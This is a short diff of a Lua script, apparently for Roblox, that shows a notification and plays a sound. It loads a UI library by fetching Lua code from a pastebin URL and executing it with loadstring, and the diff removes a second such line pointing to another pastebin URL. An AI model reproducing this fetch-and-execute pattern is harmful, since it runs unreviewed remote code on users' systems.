@@ -30,7 +30,6 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
         Duration = 3;
         wait(3)
 local library = loadstring(game:HttpGet('https://pastebin.com/raw/rS2635sh'))()
-loadstring(game:HttpGet(('https://pastebin.com/raw/pAXg2PGC'), true))();
 
     local sound = Instance.new("Sound", Workspace)
     sound.Pitch = 1 -- Speed of the song (Preffer not to change it)
